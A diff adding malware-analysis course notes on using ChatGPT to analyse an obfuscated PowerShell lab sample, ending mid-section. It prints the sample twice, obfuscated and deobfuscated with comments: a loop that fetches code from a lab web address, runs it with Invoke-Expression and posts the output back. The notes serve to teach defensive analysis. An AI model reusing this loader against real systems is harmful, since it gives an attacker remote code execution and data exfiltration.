@@ -3763,3 +3763,75 @@ exists websites -->  that allow you to create an online malware sandbox (to exec
 ##  Advanced Script Analysis with ChatGPT
 LAB:
 `PMAT-labs/labs/5-1.Automation/chatGPT-script-analysis`
+
+You can use chatGPT:
+to static analysis 
+
+=>
+- open the obfuscated-1.ps1 inside an editor![[Pasted image 20240320112951.png]]
+  
+- it looks like an obfuscated malware
+- <span style="background:#d2cbff"> Open chatGPT and ask:</span>
+  I'm a cybersecuirity researcher and a malware analyst. I'm trying to reverse engineering a script that I believed it's malicious.
+  Start by pretty printing the following Powershell:
+  `$U=("{4}{7}{0}{3}{2}{1}{6}{5}"-f'/www.easts','cal:','oparts.lo','ideaut','http','080/','8',':/');while(1){$S=iwr $U -proxy ("{0}{3}{4}{1}{5}{2}"-f 'htt','.local','4','p://proxy.zay','n',':123') -UseBasicParsing;if ($s){try{$D=iex $S |out-string;$H=[system.Text.Encoding]::Default.GetBytes($D)}catch{$D=$_.Exception.Message;$H=[system.Text.Encoding]::Default.GetBytes($D)}iwr $U -Method ("{1}{0}"-f'ost','P') -Body $H}random 10 |Sleep}`
+
+<span style="background:#b1ffff">ChatGPT output:</span>
+![[Pasted image 20240320113339.png]]
+This script appears to be a malicious PowerShell script. Here's what it does:
+1. It defines a URL `$U` using string formatting.
+2. It enters an infinite loop `while (1)` to keep the script running indefinitely.
+3. Inside the loop:
+    - It sends an HTTP request to the defined URL `$U` with proxy settings.
+    - If a response is received:
+        - It attempts to execute the received script (`$S`) using `Invoke-Expression` (`iex`).
+        - If execution is successful, it captures the output and converts it to a byte array.
+        - If execution fails, it captures the error message and converts it to a byte array.
+        - It then sends another HTTP request to the same URL `$U` with method `POST` and the output/error message as the body of the request.
+    - It then sleeps for a random duration (between 0 and 9 seconds) before repeating the process.
+
+This script essentially acts as a downloader and executor of potentially malicious scripts fetched from a remote server. It continuously fetches scripts from the specified URL, executes them, and reports the results back to the server. Additionally, it utilizes a proxy for the initial HTTP request.
+
+<span style="background:#d2cbff">Ask for the code with comment:</span>
+Can you add a comment to each line of the code to explain what it does?
+
+<span style="background:#b1ffff">Response:</span>
+```Powershell
+# Defining URL components
+$U = ("{4}{7}{0}{3}{2}{1}{6}{5}" -f '/www.easts', 'cal:', 'oparts.lo', 'ideaut', 'http', '080/', '8', ':/')
+
+# Continuously loop
+while (1) {
+	# Send an HTTP request to the URL with proxy settings
+	$S = Invoke-WebRequest $U -Proxy ("{0}{3}{4}{1}{5}{2}" -f 'htt', '.local', '4',  
+	                                  'p://proxy.zay', 'n', ':123') -UseBasicParsing
+
+	# If response is received
+	if ($S) {
+		# Try executing the received script, catch any errors
+		try {
+			$D = Invoke-Expression $S.Content | Out-String
+			$H = [System.Text.Encoding]::Default.GetBytes($D)
+		} catch {
+			$D = $_.Exception.Message
+			$H = [System.Text.Encoding]::Default.GetBytes($D)
+		}
+	
+		# Send an HTTP request to the URL with method 'POST' and body as the script's 
+		# output
+		Invoke-WebRequest $U -Method ('POST') -Body $H
+	}
+	
+	# Sleep for random duration
+	Get-Random -Minimum 0 -Maximum 10 | Start-Sleep
+}
+```
+
+<span style="background:#d2cbff">Ask for reassemble the URL:</span>
+For the following line, can you reassemble the URL using placeholders and their corresponding values:
+`$U = ("{4}{7}{0}{3}{2}{1}{6}{5}" -f '/www.easts', 'cal:', 'oparts.lo', 'ideaut', 'http', '080/', '8', ':/')`
+
+<span style="background:#d2cbff">Ask for report:</span>
+Write a malware analysis report for static analysis of this script
+
+<span style="background:#d2cbff">Ask for report:</span>
